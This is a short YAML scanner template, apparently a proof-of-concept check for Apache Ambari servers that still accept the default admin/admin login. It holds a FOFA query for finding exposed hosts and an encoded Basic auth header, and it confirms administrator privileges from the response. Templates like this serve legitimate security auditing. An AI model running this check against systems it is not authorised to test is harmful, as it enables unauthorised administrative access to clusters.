id: apache-ambari-default-password

info:
    name: apache-ambari-default-password
    author: wulalalaaa(https://github.com/wulalalaaa)
    severity: high
    description: | 
        fofa app="APACHE-Ambari" admin/admin

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name
            headers:
                Authorization: Basic YWRtaW46YWRtaW4=
        expression: response.status == 200 && response.body.bcontains(b"PrivilegeInfo") && response.body.bcontains(b"AMBARI.ADMINISTRATOR")
expression: r0()
